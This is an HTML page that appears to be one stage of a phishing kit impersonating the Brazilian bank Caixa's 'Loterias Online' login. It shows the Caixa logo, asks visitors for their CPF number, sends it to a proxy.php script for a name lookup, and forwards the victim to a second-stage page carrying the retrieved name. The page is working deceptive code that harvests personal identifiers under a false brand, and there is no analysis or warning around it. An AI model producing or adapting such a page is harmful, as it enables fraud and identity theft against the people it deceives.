<!doctype html>
<html lang="pt-br">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loterias Online</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
   
  </head>
  <style>
    @font-face {
        font-family: 'Futura-Book';
        src: url('../font/Futura-Book.eot');
        src: url('../font/Futura-Book.eot@') format('embedded-opentype'),
            url('../font/Futura-Book.woff2') format('woff2'),
            url('../font/Futura-Book.woff') format('woff'),
            url('../font/Futura-Book.ttf') format('truetype'),
            url('../font/Futura-Book.svg') format('svg');
        font-weight: normal;
        font-style: normal;
        font-display: swap;
    }

    body {
        font-family: 'Futura-Book' !important;
    }

    .container-bg {
        background: linear-gradient(45deg, #00a9ad, #005ca9); 
        background-size: 100%;
        background-repeat: no-repeat;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .container-principal {
        height: auto;
        margin: 0 auto;
        background-color: white;
        width: 450px;
        max-width: 95%;
        color: black;
        background-color: #fff !important;
        border-radius: .4rem;
        box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
        padding: 3rem 4rem;
    }

    @media (max-width: 576px) {
        .container-principal {
            padding: 3rem 2rem !important;
        } 
    }

    .container-principal img {
        width: 150px;
    }

    .container-principal h1 {
        color: #0070ae;
        font-size: 1rem;
        margin-top: .4rem;
    }

    .container-principal h2 {
        color: #4d7880;
        font-size: 1.1rem;
        margin-top: 1rem;
        margin-bottom: 2.2rem;
        width: 100%;
        text-align: justify;
    }

    .container-principal h3 {
        color: #0070ae;
        font-size: 1rem;
        margin-top: .6rem;
    }

    .container-principal h3 a{
        color: #0070ae;
        font-weight: 600;
    }


    .container-principal form {
        width: 100%;
        display: flex;
        flex-direction: column;
    }

    .container-principal .form-group {
        position: relative;
        width: 100%;
        margin-bottom: 1.5rem;
    }

    .container-principal form label {
        position: absolute;
        top: 11%;
        left: 0;
        transform: translateY(-11%);
        color: #4d7880;
        font-size: 1rem;
        pointer-events: none;
        transition: all 0.3s ease;
    }

    .container-principal form input {
        font-size: 1rem;
        margin: 0 !important;
        padding: 0 !important;
        height: 40px;
        width: 100%;
        border: none;
        border-bottom: 1.3px orange solid !important;
        padding-left: 5px;
        color: #4d7880;
    }

    .container-principal form input:focus {
        outline: 0px !important;
    }


    .botoes {
        margin-top: 2rem;
    }

    button.botoes  {
        margin-top: 1.5rem;
        background-color: #f39200;
        color: white;
        font-weight: 500;
        width: 100%;
        border: none;
        padding: .5rem 1rem;
        font-size: 1rem;
        border-radius: .2rem;
        margin-bottom: .4rem
    }

    button.botoes:hover {
        background-color: #173e68;
        color: white;
    }
    
  </style>
  <body>
    <div class="container-bg">
        <div class="container-principal d-flex justify-content-center align-items-center flex-column">
            <img src="../img/logo-caixa.webp" alt="">
            <h1>Login Caixa</h1>
            <h2>Informe seu CPF e clique em "Próximo" para continuar:</h2>
            <form id="cpfForm">
                <div class="form-group">
                    <label for="cpf">CPF</label>
                    <input name="cpf" id="cpf" type="text" onkeyup="formatCpf(this)" maxlength="14">
                    <button class="botoes" type="submit">Próximo</button>
                </div>
            </form>
            
            <h3>É novo por aqui? <a href="#">Cadastre-se</a></h3>
            <h3><a href="#">Preciso de ajuda</a></h3>
        </div>
    </div>

    

    <script>
    function formatCpf(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 3) value = value.replace(/^(\d{3})(\d)/, '$1.$2');
        if (value.length > 6) value = value.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
        if (value.length > 9) value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
        input.value = value;
    }

    document.getElementById('cpfForm').addEventListener('submit', async function (event) {
        event.preventDefault();

        const cpfInput = document.getElementById('cpf');
        const cpf = cpfInput.value.replace(/\D/g, '');
        const button = this.querySelector('button[type="submit"]');

        button.disabled = true;
        button.textContent = 'Consultando...';
        button.style.opacity = '0.5';

        try {
            if (cpf.length !== 11) {
                throw new Error('Por favor, digite um CPF válido.');
            }

            const response = await fetch('proxy.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cpf })
            });

            if (!response.ok) {
                throw new Error('Erro ao consultar o CPF.');
            }

            const data = await response.json();

            if (data.nome) {
                const name = encodeURIComponent(data.nome);
                window.location.href = `../2/?name=${name}`;
            } else {
                throw new Error('CPF inválido.');
            }
        } catch (error) {
            console.error('Erro na consulta:', error);

            alert('CPF inválido. Por favor, tente novamente.');
        } finally {
            button.disabled = false;
            button.textContent = 'Próximo';
            button.style.opacity = '1';
        }
    });
</script>

    

    <script>
            document.addEventListener('DOMContentLoaded', function() {
            const input = document.getElementById('cpf');
            const label = input.previousElementSibling; 

            function moveLabel() {
                if (input.value.trim() !== '') {
                    label.style.top = '-15px';
                } else {
                    label.style.top = '11%';
                }
            }

            input.addEventListener('focus', function() {
                label.style.top = '-15px';
            });

            input.addEventListener('blur', moveLabel);

            input.addEventListener('input', moveLabel);

            moveLabel();
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
  </body>
</html>